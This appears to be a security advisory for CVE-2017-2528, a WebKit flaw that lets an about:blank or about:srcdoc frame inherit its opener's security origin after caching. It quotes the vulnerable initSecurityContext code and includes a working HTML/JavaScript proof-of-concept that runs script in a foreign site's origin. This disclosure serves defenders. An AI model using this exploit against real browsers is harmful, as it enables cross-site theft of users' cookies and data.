
CVE-2017-2528


When a document loads "about:blank" or "about:srcdoc", it tries to inherit the security origin from its parent frame, or its opener frame if the parent frame doesn&#039;t exist. Normally, it doesn&#039;t happen that a subframe&#039;s document inherits its opener frame&#039;s security origin, because it has the parent frame. And it shouldn&#039;t happen at all. However, when the subframe is cached, only the parent frame is detached but not the opener frame. So, inheriting the opener frame&#039;s security origin could happen in that case.

void Document::initSecurityContext()
{
    ...
    if (!shouldInheritSecurityOriginFromOwner(m_url)) <<----- check m_url is about:blank or about:srcdoc.
        return;

    // If we do not obtain a meaningful origin from the URL, then we try to
    // find one via the frame hierarchy.
    Frame* parentFrame = m_frame->tree().parent();
    Frame* openerFrame = m_frame->loader().opener();

    Frame* ownerFrame = parentFrame;
    if (!ownerFrame)
        ownerFrame = openerFrame;

    if (!ownerFrame) {
        didFailToInitializeSecurityOrigin();
        return;
    }

    ...
    setCookieURL(ownerFrame->document()->cookieURL());
    // We alias the SecurityOrigins to match Firefox, see Bug 15313
    // <a href="https://bugs.webkit.org/show_bug.cgi?id=15313" title="" class="" rel="nofollow">https://bugs.webkit.org/show_bug.cgi?id=15313</a>
    setSecurityOriginPolicy(ownerFrame->document()->securityOriginPolicy());
    ...
}

PoC:
<body>
Click anywhere.
<script>

window.onclick = () => {
    window.onclick = null;

    let w = open(&#039;about:blank&#039;, &#039;&#039;, &#039;width=500, height=500&#039;);
    w.eval(`
let f = document.body.appendChild(document.createElement(&#039;iframe&#039;));
f.contentWindow.name = &#039;zzz&#039;;
opener.open(&#039;about:blank&#039;, &#039;zzz&#039;);

function navigate(w, url, cb = null) {
    w.__check = true;

    let a = w.document.createElement(&#039;a&#039;);
    a.href = url;
    a.click();

    if (!cb)
        return;

    let it = setInterval(() => {
        let navigated = false;
        try {
            if (!w.__check)
                navigated = true;
        } catch (e) {
            navigated = true;
        }

        if (navigated) {
            clearInterval(it);
            cb();
        }
    }, 10);
}

navigate(opener, &#039;<a href="https://abc.xyz/" title="" class="" rel="nofollow">https://abc.xyz/</a>&#039;, () => {
    f.srcdoc = &#039;<script>opener.alert(opener.location);</scrip&#039; + &#039;t>&#039;;
    f.contentWindow.onbeforeunload = () => {
        f.contentWindow.onbeforeunload = null;

        navigate(window, &#039;about:blank&#039;);
    };

    navigate(f.contentWindow, &#039;about:srcdoc&#039;);
});`);
}

</script>
</body>


This bug is subject to a 90 day disclosure deadline. After 90 days elapse
or a patch has been made broadly available, the bug report will become
visible to the public.




Found by: lokihardt

